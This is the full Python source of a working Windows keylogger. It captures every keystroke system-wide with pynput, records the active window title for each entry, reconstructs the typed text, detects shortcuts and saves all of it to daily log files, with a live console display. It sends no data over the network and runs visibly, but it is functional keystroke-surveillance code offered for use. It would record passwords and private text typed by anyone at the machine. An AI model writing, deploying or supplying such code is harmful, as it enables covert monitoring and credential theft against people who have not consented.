"""
High-Performance Windows Keylogger
===================================
Console-based keystroke capture with real-time window tracking,
shortcut detection, circular buffer, and a live-updating console UI.

Exit: Ctrl+C
"""

import ctypes
import ctypes.wintypes
import os
import sys
import signal
import threading
import time
from collections import deque
from datetime import datetime
from pathlib import Path

try:
    from pynput import keyboard
except ImportError:
    print("Error: pynput is required. Install with: pip install pynput")
    sys.exit(1)


# ── Windows API ───────────────────────────────────────────────────────────────

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

ENUM_WINDOWS_PROC = ctypes.WINFUNCTYPE(
    ctypes.wintypes.BOOL,
    ctypes.wintypes.HWND,
    ctypes.wintypes.LPARAM,
)


def get_foreground_window_title():
    """Return the title of the currently focused window."""
    try:
        hwnd = user32.GetForegroundWindow()
        length = user32.GetWindowTextLengthW(hwnd)
        if length > 0:
            buf = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value
    except Exception:
        pass
    return "Unknown"


def get_open_windows():
    """Enumerate all visible windows that have a title."""
    windows = []

    def _enum_callback(hwnd, _lparam):
        if user32.IsWindowVisible(hwnd):
            length = user32.GetWindowTextLengthW(hwnd)
            if length > 0:
                buf = ctypes.create_unicode_buffer(length + 1)
                user32.GetWindowTextW(hwnd, buf, length + 1)
                title = buf.value.strip()
                if title and title not in ("Program Manager",):
                    windows.append(title)
        return True

    cb = ENUM_WINDOWS_PROC(_enum_callback)
    user32.EnumWindows(cb, 0)
    return windows


def enable_virtual_terminal():
    """Enable ANSI escape sequence processing on Windows 10+."""
    STD_OUTPUT_HANDLE = -11
    ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
    handle = kernel32.GetStdHandle(STD_OUTPUT_HANDLE)
    mode = ctypes.wintypes.DWORD()
    kernel32.GetConsoleMode(handle, ctypes.byref(mode))
    kernel32.SetConsoleMode(
        handle, mode.value | ENABLE_VIRTUAL_TERMINAL_PROCESSING
    )


# ── Log directory ────────────────────────────────────────────────────────────

LOGS_DIR = Path(__file__).parent / "logs"
LOGS_DIR.mkdir(exist_ok=True)

PID_FILE = Path(__file__).parent / "keylogger.pid"


def is_already_running():
    """Check if another instance is already running via PID file."""
    if not PID_FILE.exists():
        return False
    try:
        import subprocess
        pid = int(PID_FILE.read_text(encoding="utf-8").strip())
        result = subprocess.run(
            ["tasklist", "/FI", f"PID eq {pid}", "/NH", "/FO", "CSV"],
            capture_output=True, text=True,
        )
        if str(pid) in result.stdout:
            return True
        # stale PID file — process no longer exists
        PID_FILE.unlink(missing_ok=True)
        return False
    except Exception:
        return False


# ── Circular Log Buffer ──────────────────────────────────────────────────────

class LogBuffer:
    """Thread-safe circular buffer backed by collections.deque.
    Also persists every entry to logs/YYYY-MM-DD.log on disk."""

    def __init__(self, maxlen=100):
        self._buf = deque(maxlen=maxlen)
        self._lock = threading.Lock()

    def append(self, entry):
        with self._lock:
            self._buf.append(entry)
        self._write_to_disk(entry)

    def recent(self, n=25):
        with self._lock:
            items = list(self._buf)
        return items[-n:]

    def __len__(self):
        with self._lock:
            return len(self._buf)

    @staticmethod
    def _write_to_disk(entry):
        try:
            log_file = LOGS_DIR / f"{datetime.now():%Y-%m-%d}.log"
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(entry + "\n")
        except Exception:
            pass


# ── Keystroke Processor ──────────────────────────────────────────────────────

class KeystrokeProcessor:
    """
    Translates raw pynput key events into human-readable log entries.

    Design decisions for performance under high input pressure:
    - Regular characters are accumulated in a text buffer and flushed as a
      single "Keystroke: ..." entry after a short idle timeout (0.4 s) or
      when a special key / shortcut / window change interrupts the flow.
    - This avoids one log entry per character and keeps the buffer tidy.
    - Modifier keys are tracked in a set for shortcut detection.
    """

    SPECIAL_KEYS = {
        keyboard.Key.enter:        "Enter key",
        keyboard.Key.space:        " ",          # folded into text buffer
        keyboard.Key.backspace:    "Backspace",
        keyboard.Key.tab:          "Tab key",
        keyboard.Key.esc:          "Escape",
        keyboard.Key.delete:       "Delete",
        keyboard.Key.caps_lock:    "Caps Lock",
        keyboard.Key.up:           "Up Arrow",
        keyboard.Key.down:         "Down Arrow",
        keyboard.Key.left:         "Left Arrow",
        keyboard.Key.right:        "Right Arrow",
        keyboard.Key.home:         "Home",
        keyboard.Key.end:          "End",
        keyboard.Key.page_up:      "Page Up",
        keyboard.Key.page_down:    "Page Down",
        keyboard.Key.insert:       "Insert",
        keyboard.Key.num_lock:     "Num Lock",
        keyboard.Key.f1:  "F1",  keyboard.Key.f2:  "F2",
        keyboard.Key.f3:  "F3",  keyboard.Key.f4:  "F4",
        keyboard.Key.f5:  "F5",  keyboard.Key.f6:  "F6",
        keyboard.Key.f7:  "F7",  keyboard.Key.f8:  "F8",
        keyboard.Key.f9:  "F9",  keyboard.Key.f10: "F10",
        keyboard.Key.f11: "F11", keyboard.Key.f12: "F12",
    }

    MODIFIERS = {
        keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
        keyboard.Key.alt_l,  keyboard.Key.alt_r,
        keyboard.Key.shift,  keyboard.Key.shift_r,
        keyboard.Key.cmd,    keyboard.Key.cmd_r,
    }

    RECON_MAX_LEN = 500       # auto-emit if buffer exceeds this
    RECON_MAX_AGE = 5.0       # auto-emit after this many seconds

    def __init__(self, log_buffer):
        self.log = log_buffer
        self.active_mods = set()
        self._text = ""
        self._text_lock = threading.Lock()
        self._flush_timer = None
        self._flush_delay = 0.4   # seconds of idle before auto-flush
        self._window = ""
        self._recon = ""
        self._recon_start = 0.0   # timestamp of first char in current recon

    # ── public API called by the Listener callbacks ──

    def set_window(self, title):
        if title != self._window:
            self.flush()
            self._emit_recon()
            self._window = title

    def on_press(self, key):
        if key in self.MODIFIERS:
            self.active_mods.add(key)
            return

        # Shortcut detection (any modifier held + a non-modifier key)
        if self.active_mods:
            self.flush()
            self._emit(f"Shortcut: {self._shortcut_label(key)}")
            return

        # Space → append to text buffer
        if key == keyboard.Key.space:
            self._append_char(" ")
            return

        # Enter → flush text, emit reconstructed text, then log Enter
        if key == keyboard.Key.enter:
            self.flush()
            self._emit_recon()
            self._emit("Enter key")
            return

        # Backspace → remove last char from buffer (or log if empty)
        if key == keyboard.Key.backspace:
            if self._recon:
                self._recon = self._recon[:-1]
            with self._text_lock:
                if self._text:
                    self._text = self._text[:-1]
                    self._schedule_flush()
                    return
            self._emit("Backspace")
            return

        # Other special keys
        label = self.SPECIAL_KEYS.get(key)
        if label is not None:
            self.flush()
            self._emit(label)
            return

        # Printable characters
        try:
            ch = key.char
            if ch and ch.isprintable():
                self._append_char(ch)
                return
        except AttributeError:
            pass

    def on_release(self, key):
        self.active_mods.discard(key)

    def flush(self):
        """Flush the text buffer into a log entry (if non-empty)."""
        if self._flush_timer:
            self._flush_timer.cancel()
            self._flush_timer = None
        with self._text_lock:
            text = self._text
            self._text = ""
        if text:
            self._emit(f"Keystroke: {text}")
        # time-based recon emit (prevents unbounded growth during gaming)
        if self._recon and self._recon_start and \
                (time.monotonic() - self._recon_start) >= self.RECON_MAX_AGE:
            self._emit_recon()

    def shutdown(self):
        self.flush()
        self._emit_recon()

    # ── internals ──

    def _append_char(self, ch):
        with self._text_lock:
            self._text += ch
        if not self._recon:
            self._recon_start = time.monotonic()
        self._recon += ch
        if len(self._recon) >= self.RECON_MAX_LEN:
            self._emit_recon()
        self._schedule_flush()

    def _emit_recon(self):
        """Emit the reconstructed text summary and reset the buffer."""
        text = self._recon.strip()
        self._recon = ""
        self._recon_start = 0.0
        if text:
            self._emit(f"Text: {text}")

    def _schedule_flush(self):
        if self._flush_timer:
            self._flush_timer.cancel()
        t = threading.Timer(self._flush_delay, self.flush)
        t.daemon = True
        t.start()
        self._flush_timer = t

    def _emit(self, message):
        ts = datetime.now().strftime("%H:%M:%S")
        win = self._window or "Unknown"
        self.log.append(f"[{ts}] [{win}] {message}")

    def _shortcut_label(self, key):
        parts = []
        if self._mod_active(keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
            parts.append("Ctrl")
        if self._mod_active(keyboard.Key.alt_l, keyboard.Key.alt_r):
            parts.append("Alt")
        if self._mod_active(keyboard.Key.shift, keyboard.Key.shift_r):
            parts.append("Shift")
        if self._mod_active(keyboard.Key.cmd, keyboard.Key.cmd_r):
            parts.append("Win")
        try:
            name = key.char.upper() if key.char else str(key)
        except AttributeError:
            name = self.SPECIAL_KEYS.get(
                key, str(key).replace("Key.", "").capitalize()
            )
        parts.append(name)
        return "+".join(parts)

    def _mod_active(self, left, right):
        return left in self.active_mods or right in self.active_mods


# ── Console UI ────────────────────────────────────────────────────────────────

class ConsoleUI:
    """
    Renders a live-updating console display showing:
      - the currently active window
      - a list of open windows
      - recent log entries (colour-coded)
    """

    # ANSI helpers
    RST = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    CYAN = "\033[36m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    RED = "\033[31m"
    WHITE = "\033[97m"
    GRAY = "\033[90m"

    def __init__(self, log_buffer):
        self.log = log_buffer
        self._active = ""
        self._windows = []
        self._lock = threading.Lock()

    def update_windows(self, active, windows):
        with self._lock:
            self._active = active
            self._windows = windows[:12]

    def render(self):
        try:
            cols = os.get_terminal_size().columns
            rows = os.get_terminal_size().lines
        except OSError:
            cols, rows = 80, 24

        C = self  # alias for colour constants
        out = []

        # cursor home (no clear – reduces flicker)
        out.append("\033[H")

        # ── header ──
        title = " KEYLOGGER "
        pad_l = (cols - len(title)) // 2
        pad_r = cols - pad_l - len(title)
        out.append(
            f"{C.CYAN}{C.BOLD}"
            f"{'─' * pad_l}{title}{'─' * pad_r}"
            f"{C.RST}"
        )
        out.append("")

        # ── active window ──
        with self._lock:
            active = self._active
            windows = list(self._windows)

        out.append(
            f"  {C.GREEN}{C.BOLD}▶ Active Window:{C.RST} "
            f"{C.WHITE}{self._trunc(active, cols - 22)}{C.RST}"
        )
        out.append("")

        # ── open windows ──
        out.append(f"  {C.YELLOW}{C.BOLD}Open Windows:{C.RST}")
        shown = min(len(windows), 8)
        for w in windows[:shown]:
            marker = "●" if w == active else "○"
            colour = C.WHITE if w == active else C.GRAY
            out.append(
                f"    {colour}{marker} {self._trunc(w, cols - 8)}{C.RST}"
            )
        if len(windows) > shown:
            out.append(f"    {C.DIM}… and {len(windows) - shown} more{C.RST}")
        out.append("")

        # ── separator ──
        out.append(f"  {C.CYAN}{'─' * (cols - 4)}{C.RST}")
        out.append("")

        # ── recent activity ──
        out.append(f"  {C.YELLOW}{C.BOLD}Recent Activity:{C.RST}")

        header_lines = len(out) + 3  # reserve 3 for footer
        avail = max(5, rows - header_lines)
        entries = self.log.recent(avail)

        if entries:
            for entry in entries:
                line = self._trunc(entry, cols - 6)
                if "Shortcut:" in entry:
                    out.append(f"    {C.CYAN}{line}{C.RST}")
                elif "Enter key" in entry:
                    out.append(f"    {C.GREEN}{line}{C.RST}")
                elif "Keystroke:" in entry:
                    out.append(f"    {C.WHITE}{line}{C.RST}")
                elif "[Error]" in entry:
                    out.append(f"    {C.RED}{line}{C.RST}")
                else:
                    out.append(f"    {C.GRAY}{line}{C.RST}")
        else:
            out.append(f"    {C.DIM}Waiting for input…{C.RST}")

        # pad remaining lines to overwrite stale content
        current_lines = len(out) + 2  # +2 for footer
        for _ in range(max(0, rows - current_lines)):
            out.append(" " * cols)

        # ── footer ──
        out.append("")
        out.append(
            f"  {C.DIM}Ctrl+C to exit  │  "
            f"Buffer: {len(self.log)}/100{C.RST}"
        )

        # Pad every line to full width to erase old content
        padded = []
        for line in out:
            # Visible length is tricky with ANSI, so just pad generously
            padded.append(line + "\033[K")  # \033[K = erase to end of line

        sys.stdout.write("\n".join(padded))
        sys.stdout.flush()

    @staticmethod
    def _trunc(text, maxlen):
        if len(text) > maxlen:
            return text[: maxlen - 1] + "…"
        return text


# ── Main Application ─────────────────────────────────────────────────────────

class Keylogger:
    """Orchestrates window monitoring, keystroke capture, and the console UI."""

    def __init__(self):
        self.log_buffer = LogBuffer(maxlen=100)
        self.ui = ConsoleUI(self.log_buffer)
        self.processor = KeystrokeProcessor(self.log_buffer)
        self.running = True
        self._listener = None

    def run(self):
        enable_virtual_terminal()

        # Write PID file so watch.py can stop us
        PID_FILE.write_text(str(os.getpid()), encoding="utf-8")

        # Hide cursor
        sys.stdout.write("\033[?25l")
        sys.stdout.flush()

        # Graceful exit on Ctrl+C
        signal.signal(signal.SIGINT, self._signal_handler)

        # Background threads
        threading.Thread(target=self._poll_windows, daemon=True).start()
        threading.Thread(target=self._refresh_ui, daemon=True).start()

        # Keyboard listener (blocks until stopped)
        self._listener = keyboard.Listener(
            on_press=self.processor.on_press,
            on_release=self.processor.on_release,
        )
        self._listener.start()

        try:
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            pass
        finally:
            self._shutdown()

    # ── background workers ──

    def _poll_windows(self):
        while self.running:
            try:
                active = get_foreground_window_title()
                windows = get_open_windows()
                self.processor.set_window(active)
                self.ui.update_windows(active, windows)
            except Exception as e:
                self.log_buffer.append(f"[Error] Window tracking: {e}")
            time.sleep(0.5)

    def _refresh_ui(self):
        while self.running:
            try:
                self.ui.render()
            except Exception:
                pass
            time.sleep(0.25)

    # ── shutdown ──

    def _signal_handler(self, _sig, _frame):
        self.running = False

    def _shutdown(self):
        self.running = False
        self.processor.shutdown()
        if self._listener:
            self._listener.stop()
        # Remove PID file
        try:
            PID_FILE.unlink(missing_ok=True)
        except Exception:
            pass
        # Restore cursor
        sys.stdout.write("\033[?25h\n")
        sys.stdout.flush()
        print("\nKeylogger stopped.")


# ── Entry point ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    if is_already_running():
        print("Keylogger is already running.")
        sys.exit(0)
    app = Keylogger()
    app.run()
